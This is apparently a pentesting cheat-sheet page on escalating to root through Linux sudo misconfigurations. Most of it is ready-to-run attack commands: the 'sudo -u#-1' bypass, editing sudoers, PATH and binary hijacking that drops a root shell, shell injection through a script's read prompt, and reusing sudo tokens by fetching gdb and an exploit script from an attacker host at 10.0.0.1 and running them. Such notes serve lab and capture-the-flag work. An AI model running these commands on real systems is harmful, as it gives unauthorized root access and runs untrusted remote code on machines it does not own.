---
title: Sudo Privilege Escalation
description: Sudo commands might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-10-30
draft: false
---

## GTFOBins

[GTFOBins](https://gtfobins.github.io/) provides a wide variety of payloads to privilege escalation.  
So it's recommended to look for in there.

<br />

## Investigation

### Version

```sh
sudo --version
```

If the sudo **version <=1.28**, try the following command.

```sh
sudo -u#-1 /bin/bash
```

### As Another Users

```sh
sudo su root
sudo -u john whoami
# -s: run shell as target user
sudo -s
```

### List Privileges Commands

We may be able to see the commands available as another user.

```sh
sudo -l
sudo -ll

# Specify hostname
sudo -h <host-name> -l
# Execute via the hostname
sudo -h <host-name> /bin/bash
```

Also we might see from following files.

```sh
cat /etc/sudoers
cat /etc/sudoers.d/usersgroup
```

If we find the following result for sudoers,

```bash
(ALL, !root) NOPASSWD: /bin/bash
```

We might be able to get a root shell as follow.

```bash
sudo -u#-1 /bin/bash
```

<br />

## Edit Sudoers

If we have permission to write `/etc/sudoers`, we can modify this file.

```bash
sudo visudo -f /etc/sudoers
```

Now add the following line to allow us to execute all commands as root.  
Assume we logged in as `john`.

```bash
# Unrestriction
john ALL=(ALL:ALL) ALL
# or
john ALL=(root) NOPASSWD: ALL

# Specific command as root
john ALL=(root) NOPASSWD: /usr/bin/passwd
```

<br />

## Command Forgery (NOPASSWD)

If you are allowed to execute some command, you can forge the contents of the command.  
First off, check the properties.

```sh
sudo -l
(root) NOPASSWD: somecmd
```

If you can confirm that it can be executed as root without password, create the same named command in the arbitrary folder in which you can write files.

```sh
# option 1
echo /bin/sh > /tmp/somecmd
```

Next, change the permission for allowing to execute it.  
And add the path to the environment.

```sh
chmod +x /tmp/somecmd
export PATH=/tmp:$PATH
```

Now execute the command as root.  


```sh
sudo somecmd
whoami
# root
```

<br />

## Command Forgery (SETENV, NOPASSWD)

If you found there is a **SETENV:** in sudoers, you can set the **PATH** when running the command.

```sh
sudo -l
(root) SETENV: NOPASSWD: somecmd
```

As the previous section, prepare the payload.

```sh
echo '/bin/bash -p' > /tmp/somecmd
chmod +x /tmp/somecmd
```

Now run the command as root with setting the PATH.

```sh
sudo PATH=/tmp:$PATH somecmd
whoami
```

<br />

## Command Path Hijacking

```bash
sudo -l

env_reset
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

(root) python /home/user/example.py
```

If we can execute some command as root but **`env_reset`** and **`secure_path`** are set, we cannot override the **PATH** environment variable.  
Instead we need to check if we have permission to write each path.

```bash
ls -al /usr/local/
ls -al /usr/
ls -al /
```

Assume we can write an arbitrary binary file under **`/usr/sbin`**, we can create a payload in there.  
For example, we create a **`python`** binary under **`/usr/sbin`**.

```bash
echo /bin/bash > /usr/sbin/python
chmod +x /usr/sbin/python
```

Then execute the sudo command.

```bash
sudo python /home/user/example.py
```

Now we should get a root shell.

<br />

## Shell in Prompt

```bash
#!/bin/bash

read -p "What's you name: "
```

If we found there is another user’s script which can be executed as root, you can input **\`/bin/bash -i\`** to get a shell as another user.

<br />

## Reuse Sudo Tokens

Reference: [https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens)

If the current user executes some command using sudo, we might be able to escalate to root privilege.
Check if no restriction on ptrace.

```bash
cat /proc/sys/kernel/yama/ptrace_scope
0

# We can temporariliy set 0 if we have permissions.
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

If the target system does not have **`gdb`** binary, we can download it.

```bash
# In local machine, download the debian package.
wget http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb -O gdb.deb
python3 -m http.server

# In remote machine, download the deb package and extract it.
wget http://10.0.0.1:8000/gdb.deb
dpkg -x gdb.deb ~
```

Next, prepare the exploit script from [the repo](https://github.com/nongiach/sudo_inject) and execute it.

```bash
# In local machine, download the shell script to exploit.
wget https://github.com/nongiach/sudo_inject/blob/master/exploit.sh
python3 -m http.server

# In remote machine, download it and execute.
wget http://10.0.0.1:8000/exploit.sh
sh exploit.sh
```

After that, we can spawn the root shell.

```bash
/tmp/activate_sudo_token
sudo su
```
